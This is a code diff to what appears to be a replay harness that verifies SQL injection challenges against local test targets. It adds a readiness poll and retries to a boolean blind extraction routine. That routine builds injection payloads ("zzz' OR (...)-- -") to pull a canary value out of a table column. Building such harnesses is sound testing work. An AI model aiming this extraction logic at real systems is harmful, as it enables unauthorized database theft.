@@ -105,8 +105,13 @@ def run_replay(
         )
         if run.returncode != 0:
             return False
-        time.sleep(2)  # let the target bind its port
         base = f"http://127.0.0.1:{port}"
+        # Poll until the target actually answers, rather than guessing with a
+        # fixed sleep -- a blind re-extraction fires hundreds of requests, and
+        # if the first ones hit a not-yet-ready target the extraction comes back
+        # partial and replay wrongly fails.
+        if not _wait_ready(base):
+            return False
 
         if replay_challenge.variant.startswith("boolean"):
             # A blind variant leaks nothing in any single response, so replaying
@@ -131,6 +136,21 @@ def run_replay(
                        capture_output=True, timeout=C.DOCKER_CLI_TIMEOUT_S)
 
 
+def _wait_ready(base_url: str, *, attempts: int = 30, delay: float = 0.5) -> bool:
+    """Poll /health until the target answers, so a re-extraction never races a
+    not-yet-bound server."""
+    url = base_url.rstrip("/") + "/health"
+    for _ in range(attempts):
+        try:
+            with urllib.request.urlopen(url, timeout=2) as resp:
+                if resp.status == 200:
+                    return True
+        except Exception:
+            pass
+        time.sleep(delay)
+    return False
+
+
 _HEX = "0123456789abcdef"
 
 
@@ -142,15 +162,20 @@ def _boolean_extract(base_url, endpoint, param, table, column, *,
     base_url = base_url.rstrip("/")
     prefix = "0 OR" if context == "numeric" else "zzz' OR"
 
+    import json
+
     def btest(condition: str) -> bool:
         payload = f"{prefix} ({condition})-- -"
         url = f"{base_url}{endpoint}?" + urllib.parse.urlencode({param: payload})
-        try:
-            body = urllib.request.urlopen(url, timeout=timeout).read()
-            import json
-            return bool(json.loads(body).get("found"))
-        except Exception:
-            return False
+        # A transient network hiccup mid-extraction must not be read as "false"
+        # (that would silently corrupt the recovered canary), so retry briefly.
+        for attempt in range(3):
+            try:
+                body = urllib.request.urlopen(url, timeout=timeout).read()
+                return bool(json.loads(body).get("found"))
+            except Exception:
+                time.sleep(0.3)
+        return False
 
     subquery = f'SELECT "{column}" FROM "{table}" LIMIT 1'
     out = ""
